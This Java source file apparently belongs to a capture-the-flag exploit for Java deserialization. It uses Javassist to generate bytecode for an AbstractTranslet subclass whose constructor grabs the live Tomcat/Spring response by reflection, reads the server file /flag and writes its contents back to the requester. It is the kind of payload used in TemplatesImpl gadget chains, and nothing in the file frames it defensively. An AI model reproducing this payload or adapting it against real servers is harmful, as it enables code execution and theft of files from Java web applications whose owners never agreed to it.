package Seri;

import javassist.*;

import java.io.IOException;

public class ReadFileByServlet {
    public static byte[] getMemShellBrief() throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("DT");

        /**
         * 直接读取文件内容
         */
        String body = "javax.servlet.http.HttpServletRequest r = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "java.lang.reflect.Field f = r.getClass().getDeclaredField(\"request\");\n" +
                "f.setAccessible(true);\n" +
                "org.apache.catalina.connector.Response p =((org.apache.catalina.connector.Request) f.get(r)).getResponse();\n" +
                "java.io.Writer w = p.getWriter();\n" +
                "w.write(new java.util.Scanner(new java.io.File(\"/flag\")).next());\n" +
                "w.flush();";

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("{" + body + "}");
        clazz.addConstructor(constructor);
//        clazz.makeClassInitializer().setBody("{" + body + "}");

        // 设置 Super Class 为 AbstractTranslet
        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        return clazz.toBytecode();

    }
}
